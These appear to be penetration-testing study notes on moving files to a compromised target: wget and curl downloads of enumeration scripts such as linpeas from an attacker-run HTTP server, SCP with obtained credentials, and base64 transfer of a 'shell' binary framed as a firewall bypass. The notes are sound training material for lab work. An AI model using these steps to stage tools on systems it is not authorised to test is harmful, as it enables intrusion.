# 📂 File Transfer Techniques

During penetration testing, transferring enumeration scripts, exploits, or data between the attack host and the target is a critical step, especially when restricted to a standard reverse shell.

## 1. HTTP Transfer (Web Server)

The most common method when the target has outbound access to the attack host.

> [!abstract] **Workflow**
> 
> 1. **Attack Host**: Start a Python HTTP server in the directory containing the file.
>     
>     Bash
>     
>     ```
>     python3 -m http.server 8000
>     ```
>     
> 2. **Target Host**: Download using ==wget== or ==cURL==.
>     
>     Bash
>     
>     ```
>     # Using wget
>     wget http://<Attack_IP>:8000/linenum.sh
>     
>     # Using curl (-o to specify output file)
>     curl http://<Attack_IP>:8000/linenum.sh -o linenum.sh
>     ```
>     

## 2. SCP (Secure Copy)

Use this method if you have obtained ==valid SSH credentials== for a user on the remote host.

Bash

```
# Syntax: scp <local_file> <user>@<remote_ip>:<destination_path>
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

## 3. Base64 Encoding (Firewall Bypass)

Useful when firewalls block all incoming/outgoing connections, but you have a ==terminal session==.

> [!tip] **The Trick** Convert the binary/script into a text string, paste it into the terminal, and decode it on the other side.

1. **Attack Host** (Encode):
    
    Bash
    
    ```
    # -w 0 disables line wrapping for a clean string
    base64 <file_name> -w 0
    ```
    
2. **Target Host** (Decode):
    
    Bash
    
    ```
    echo <pasted_base64_string> | base64 -d > <file_name>
    ```
    

---

## 🛡️ Validation & Integrity

Always verify the file was transferred correctly and wasn't corrupted or truncated.

### File Type Check

Use the `file` command to ensure the binary format is correct (e.g., ELF 64-bit).

Bash

```
file shell
```

### MD5 Integrity Check

Compare the hash on both machines. If they match, the transfer is ==identical==.

Bash

```
# Run on both Attack and Target hosts
md5sum shell
```

> [!info] **Additional Tools** For more complex environments, consider exploring **SMB shares** (Impacket-smbserver) or **Netcat (nc)** for raw data streams.



|                                                        |                                                                       |
| ------------------------------------------------------ | --------------------------------------------------------------------- |
| `python3 -m http.server 8000`                          | Start a local webserver                                               |
| `wget http://10.10.14.1:8000/linpeas.sh`               | Download a file on the remote server from our local machine           |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine           |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`       | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0`                                    | Convert a file to `base64`                                            |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`      | Convert a file from `base64` back to its orig                         |
| `md5sum shell`                                         | Check the file's `md5sum` to ensure it converted correctly            |